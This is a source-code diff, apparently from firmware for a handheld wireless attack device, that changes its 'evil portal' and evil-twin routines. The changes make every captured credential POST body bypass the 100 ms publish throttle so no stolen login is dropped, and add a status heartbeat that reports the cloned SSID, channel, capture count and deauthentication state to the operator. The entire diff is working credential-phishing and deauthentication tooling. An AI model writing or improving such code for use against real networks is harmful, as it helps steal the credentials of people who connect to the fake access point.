@@ -611,8 +611,8 @@ void stepPortal(uint32_t now) {
     if (portalDnsActive) portalDns.processNextRequest();
     stepPortalDeauth(now);
 
-    // Drain captured credential POST bodies. No periodic heartbeat: a streamed
-    // sample must not be dropped by the 100 ms cadence and lose a capture.
+    // Captures are drained before the heartbeat and never gated on its cadence,
+    // so a sample can never be dropped by the periodic publish.
     std::string body;
     uint32_t sequence = 0;
     while (webDashboard::takePortalCapture(body, sequence)) {
@@ -650,9 +650,33 @@ void stepPortal(uint32_t now) {
             raw.resize(raw.size() / 2);
             doc["body"] = raw;
         }
-        runtime.publishOutput(attackTicket, std::move(payload), now);
+        // Urgent: a captured credential is a discrete event, and the portal's
+        // own 100 ms heartbeat occupies the same stream. The runtime accepts one
+        // frame per 100 ms, so without the bypass any capture landing inside the
+        // window the heartbeat just opened is dropped and only the counter moves.
+        runtime.publishOutput(attackTicket, std::move(payload), now, true);
         body.clear();
     }
+
+    // Liveness heartbeat. Without it the portal publishes only on capture, so a
+    // run nobody submits to leaves the operator's log completely silent — the
+    // dashboard cannot tell a running portal from a dead action. Same 100 ms
+    // cadence as the other continuous attacks; the dashboard throttles what it
+    // puts in the log pane.
+    if (static_cast<uint32_t>(now - lastAttackPublishMs) < kMinSniffSampleMs) return;
+    lastAttackPublishMs = now;
+    JsonDocument status;
+    status["kind"] = "evil_portal";
+    status["event"] = "status";
+    status["phase"] = "running";
+    status["cloned"] = portalCloned;
+    status["ssid"] = portalCloned ? portalCloneSsid : "";
+    if (portalCloned) status["channel"] = portalCloneChannel;
+    status["page"] = portalPageFromFile ? evilTwin::kPagePath : "builtin";
+    status["captures"] = attackCount;
+    status["elapsedMs"] = now - attackStartMs;
+    reportPortalDeauth(status);
+    publishAttackJson(status, now);
 }
 
 
@@ -702,7 +726,11 @@ void drainTwinCaptures(uint32_t now) {
             raw.resize(raw.size() / 2);
             doc["body"] = raw;
         }
-        runtime.publishOutput(attackTicket, std::move(payload), now);
+        // Urgent: a captured credential is a discrete event, and the portal's
+        // own 100 ms heartbeat occupies the same stream. The runtime accepts one
+        // frame per 100 ms, so without the bypass any capture landing inside the
+        // window the heartbeat just opened is dropped and only the counter moves.
+        runtime.publishOutput(attackTicket, std::move(payload), now, true);
         body.clear();
     }
 }
